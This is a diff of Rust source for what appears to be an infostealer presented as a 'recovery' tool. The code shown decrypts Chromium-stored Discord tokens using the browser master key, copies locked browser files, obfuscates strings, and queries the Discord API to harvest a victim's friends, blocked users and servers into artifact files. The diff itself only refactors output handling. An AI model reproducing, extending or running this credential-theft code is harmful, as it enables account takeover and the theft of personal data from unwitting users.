@@ -2,7 +2,8 @@ use crate::recovery::browser::chromium::extract_master_key;
 use crate::recovery::browser::lockedfile::copy_locked_file;
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::helpers::obfuscation::deobf;
-use crate::recovery::output::write_json_artifact;
+use crate::recovery::helpers::winhttp::{Client, StatusCode};
+use crate::recovery::output::{write_json_artifact, write_text_artifact};
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use aes_gcm::aead::Aead;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
@@ -11,7 +12,6 @@ use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
 use once_cell::sync::Lazy;
 use regex::Regex;
-use crate::recovery::helpers::winhttp::{Client, StatusCode};
 use serde::de::DeserializeOwned;
 use serde::{Deserialize, Serialize};
 use std::collections::HashSet;
@@ -187,9 +187,16 @@ struct DiscordTokenSummary<'a> {
 #[derive(Serialize, Clone)]
 struct DiscordTokenRecord {
     source: String,
-    raw: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
     decrypted: Option<String>,
+    #[serde(skip_serializing_if = "is_raw_redundant")]
+    raw: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
     error: Option<String>,
+}
+
+fn is_raw_redundant(raw: &String) -> bool {
+    raw.is_empty() || raw.starts_with("dQw4w9WgXcQ:")
 }
 
 async fn gather_discord_token_records(
@@ -388,7 +395,7 @@ impl RecoveryTask for DiscordTokenTask {
         )
         .await?;
 
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
@@ -511,7 +518,7 @@ impl RecoveryTask for BrowserDiscordTask {
         )
         .await?;
 
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
@@ -575,7 +582,7 @@ impl DiscordApiClient {
                         match relationship.kind {
                             1 => record.friends.push(label),
                             2 => record.blocked_friends.push(label),
-                            _ => {} // Ignore other relationship types
+                            _ => {}
                         }
                     }
                 }
@@ -971,7 +978,7 @@ impl RecoveryTask for DiscordProfileTask {
         )
         .await?;
 
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
@@ -1007,18 +1014,17 @@ impl RecoveryTask for DiscordServiceTask {
         let profiles = cached_discord_profiles(&self.roots, &self.local_app_data).await?;
 
         let mut user_builder = String::new();
-        let mut friends_builder = format!("Friends:\n====================\n\n");
-        let mut blocked_builder = format!("Blocked Friends:\n====================\n\n");
-        let mut owned_builder = format!("Owned Servers:\n====================\n\n");
-        let mut other_builder = format!("Other Servers:\n====================\n\n");
+        let mut friends_builder = String::new();
+        let mut blocked_builder = String::new();
+        let mut owned_builder = String::new();
+        let mut other_builder = String::new();
 
-        if profiles.is_empty() {
-            user_builder.push_str("No Discord profiles recovered.\n");
-            friends_builder.push_str("No friends recovered.\n\n");
-            blocked_builder.push_str("No blocked friends recovered.\n\n");
-            owned_builder.push_str("No owned servers recovered.\n\n");
-            other_builder.push_str("No other servers recovered.\n\n");
-        } else {
+        if !profiles.is_empty() {
+            friends_builder.push_str("Friends:\n====================\n\n");
+            blocked_builder.push_str("Blocked Friends:\n====================\n\n");
+            owned_builder.push_str("Owned Servers:\n====================\n\n");
+            other_builder.push_str("Other Servers:\n====================\n\n");
+
             for profile in profiles.iter() {
                 let user = profile.user.as_ref();
                 let display_name = user
@@ -1150,41 +1156,17 @@ impl RecoveryTask for DiscordServiceTask {
 
         let mut artifacts = Vec::new();
         artifacts.push(
-            write_discord_text_artifact(ctx, &self.label(), "Basic.txt", &user_builder).await?,
+            write_text_artifact(ctx, self.category(), &self.label(), "Basic.txt", &user_builder).await?,
         );
         artifacts.push(
-            write_discord_text_artifact(ctx, &self.label(), "Relations.txt", &relations_combined)
+            write_text_artifact(ctx, self.category(), &self.label(), "Relations.txt", &relations_combined)
                 .await?,
         );
         artifacts.push(
-            write_discord_text_artifact(ctx, &self.label(), "Servers.txt", &servers_combined)
+            write_text_artifact(ctx, self.category(), &self.label(), "Servers.txt", &servers_combined)
                 .await?,
         );
 
-        Ok(artifacts)
+        Ok(artifacts.into_iter().flatten().collect())
     }
-}
-
-async fn write_discord_text_artifact(
-    ctx: &RecoveryContext,
-    label: &str,
-    file_name: &str,
-    contents: &str,
-) -> Result<RecoveryArtifact, RecoveryError> {
-    let folder = ctx
-        .output_dir
-        .join("services")
-        .join("Messengers")
-        .join("Discord");
-    fs::create_dir_all(&folder).await?;
-
-    let target = folder.join(file_name);
-    fs::write(&target, contents).await?;
-    let meta = fs::metadata(&target).await?;
-    Ok(RecoveryArtifact {
-        label: label.to_string(),
-        path: target,
-        size_bytes: meta.len(),
-        modified: meta.modified().ok(),
-    })
 }
